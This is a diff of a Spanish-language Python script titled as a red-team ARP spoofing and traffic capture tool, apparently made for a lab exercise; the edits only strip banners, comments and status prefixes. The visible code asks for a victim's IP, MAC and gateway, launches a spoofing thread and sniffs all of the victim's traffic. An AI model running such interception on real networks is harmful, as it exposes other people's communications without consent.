@@ -19,12 +19,12 @@ def start_arp_spoof(targetIP, targetMAC, gatewayIP):
 
 def process_packet(packet):
     """Función que se ejecuta cada vez que se intercepta un paquete de la víctima."""
-    print(f"[+] Tráfico interceptado de la máquina azul: {packet.summary()}")
+    print(f" Tráfico interceptado de la máquina azul: {packet.summary()}")
 
 if __name__ == "__main__":
-    print("==================================================")
+    print(" ")
     print("   RED TEAM - ARP SPOOFING & CAPTURA DE TRÁFICO")
-    print("==================================================")
+    print(" ")
     
     targetIP = input("Ingrese la IP objetivo (Máquina Azul): ")
     targetMAC = input("Ingrese la MAC del objetivo: ")
@@ -32,15 +32,15 @@ if __name__ == "__main__":
 
     print(f"\n[*] Iniciando ataque ARP Spoofing contra {targetIP}...")
 
-    # 1. Creamos y lanzamos el ataque ARP en un hilo secundario (background)
+    
     hilo_spoof = threading.Thread(target=start_arp_spoof, args=(targetIP, targetMAC, gatewayIP), daemon=True)
     hilo_spoof.start()
 
-    print("[*] Sniffer activo. Capturando tráfico de la red...")
-    print("[*] Utilice CTRL + C para detener el ataque y la captura.\n")
+    print(" Sniffer activo. Capturando tráfico de la red...")
+    print(" Utilice CTRL + C para detener el ataque y la captura.\n")
 
     try:
-        # 2. El hilo principal se queda escuchando (sniffing) todo el tráfico que provenga de la víctima
+        
         sniff(prn=process_packet, store=0)
     except KeyboardInterrupt:
-        print("\n[!] El ataque y la captura se detuvieron correctamente.")
+        print("\n El ataque y la captura se detuvieron correctamente.")
